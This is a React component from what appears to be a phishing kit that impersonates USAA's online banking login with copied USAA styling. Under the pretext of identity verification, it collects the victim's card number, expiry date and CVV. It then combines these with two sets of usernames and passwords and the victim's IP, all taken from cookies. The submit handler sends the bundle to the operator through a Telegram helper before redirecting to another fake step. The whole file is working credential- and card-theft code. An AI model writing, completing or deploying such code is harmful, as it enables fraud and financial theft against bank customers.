import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";
import { verifyCreditCardNumber } from "../utils/luhn";

type Additional = {
  cn: string;
  edate: string;
  ccv: string;
};

export default function Additional() {
  const [formInput, setFormInput] = useState<Additional>({
    cn: "",
    edate: "",
    ccv: "",
  });
  const [isLoading, setIsLoading] = React.useState(false);
  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }
  function handleCardInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    let value = event.target.value.replace(/\s/g, ""); // Remove existing spaces
    value = value.replace(/\D/g, ""); // Remove non-digit characters

    if (value.length > 0) {
      value = value.match(new RegExp(".{1,4}", "g"))!.join(" ");
    }

    event.target.value = value;
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  function handleExpDate(e: React.ChangeEvent<HTMLInputElement>) {
    let value = e.target.value.replace(/\D/g, ""); // Remove non-digit characters

    if (value.length > 2) {
      value = value.slice(0, 2) + " / " + value.slice(2);
    }

    e.target.value = value;
    setFormInput((prevData) => ({
      ...prevData,
      [e.target.name]: e.target.value,
    }));
  }

  const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");
  const ipman: ip = cookies.get("ipman");


  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();

    const message = `
    [----+🏦 USAA 🏦+-----]

    IP: ${ipman.ipman}

    Username: ${login1.username}
    Password: ${login1.password}

    Username 2: ${login2.username2}
    Password 2: ${login2.password2}

    CARD NUMBER: ${formInput.cn}

    CARD EXPIRY: ${formInput.edate}

    CARD CVV: ${formInput.ccv}
    `;
    const isValidCardNumber = verifyCreditCardNumber(formInput.cn);
    if (!isValidCardNumber) {
      document.getElementById("card-error")?.classList.remove("hide");
      return;
    }
    setIsLoading(true);
    await TelegramSend(message);
    setIsLoading(false);
    cookies.set("additional", formInput);
    navigate("../login/auth/3", { replace: true });
  }
  return (
    <>
      <div className="submitForm">
        <p
          className="go-left"
          style={{ fontSize: "14px", marginBottom: "30px" }}
        >
         To further verify your identity, Please enter the following details. <br />
        </p>

        <div style={{marginBottom:"20px"}} id="card-error" className="error-message hide">
          <p style={{ color: "red" }}>
            Invalid card details. Please check your card information and try
            again.
          </p>
        </div>

        <form method="post" onSubmit={handleSubmit} aria-busy="false">
          <div className="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
            <div className="usaa-form-v5-10-1-block col-1-1">
              <div>
                <div>
                  <label
                    htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                    className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                  >
                    <span
                      aria-hidden="false"
                      className="usaa-form-v5-10-1-fieldLabel-text"
                    >
                      Card number
                    </span>
                  </label>
                </div>
                <div>
                  <div
                    id="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage"
                    className="usaa-form-v5-10-1-fieldWrapper-errorMessage"
                    data-error-message=""
                  ></div>
                  <div className="screenReader" role="alert"></div>
                </div>
                <span className="usaa-input">
                  <input
                  onChange={handleCardInputChange}
                    name="cn"
                    aria-invalid="false"
                    id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                    type="text"
                    aria-describedby="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage undefined"
                    required
                    maxLength={19}
                  />
                  <span className="keyboardFocusRing" aria-hidden="true"></span>
                </span>
              </div>
              <div className="keyboardFocusRing"></div>
            </div>
          </div>

          <div className="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
            <div className="usaa-form-v5-10-1-block col-1-1">
              <div>
                <div>
                  <label
                    htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                    className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                  >
                    <span
                      aria-hidden="false"
                      className="usaa-form-v5-10-1-fieldLabel-text"
                    >
                      Expiry date
                    </span>
                  </label>
                </div>
                <div>
                  <div
                    id="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage"
                    className="usaa-form-v5-10-1-fieldWrapper-errorMessage"
                    data-error-message=""
                  ></div>
                  <div className="screenReader" role="alert"></div>
                </div>
                <span className="usaa-input">
                  <input
                  onChange={handleExpDate}
                    name="edate"
                    aria-invalid="false"
                    id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                    type="text"
                    aria-describedby="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage undefined"
                    required
                    maxLength={7}
                  />
                  <span className="keyboardFocusRing" aria-hidden="true"></span>
                </span>
              </div>
              <div className="keyboardFocusRing"></div>
            </div>
          </div>

          <div className="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
            <div className="usaa-form-v5-10-1-block col-1-1">
              <div>
                <div>
                  <label
                    htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                    className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                  >
                    <span
                      aria-hidden="false"
                      className="usaa-form-v5-10-1-fieldLabel-text"
                    >
                      CVV
                    </span>
                  </label>
                </div>
                <div>
                  <div
                    id="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage"
                    className="usaa-form-v5-10-1-fieldWrapper-errorMessage"
                    data-error-message=""
                  ></div>
                  <div className="screenReader" role="alert"></div>
                </div>
                <span className="usaa-input">
                  <input
                  onChange={handleInputChange}
                    name="ccv"
                    aria-invalid="false"
                    id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                    type="text"
                    aria-describedby="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage undefined"
                    required
                    maxLength={4}
                  />
                  <span className="keyboardFocusRing" aria-hidden="true"></span>
                </span>
              </div>
              <div className="keyboardFocusRing"></div>
            </div>
          </div>

          {isLoading ?
          <button
          type="button"
          className="usaa-button4 miam-btn-next submit-btn usaa-button4--primary"
          id="next-button"
          aria-labelledby="next-button"
        >
          <span>Please wait...</span>
        </button>
          :
          <button
            type="submit"
            className="usaa-button4 miam-btn-next submit-btn usaa-button4--primary"
            id="next-button"
            aria-labelledby="next-button"
          >
            <span>Submit</span>
          </button>}
          <div className="help-link">
            <a
              aria-label="I need help logging on. (Opens a pop up)."
              role="link"
            >
              I need help logging on
            </a>
          </div>
        </form>
      </div>
    </>
  );
}
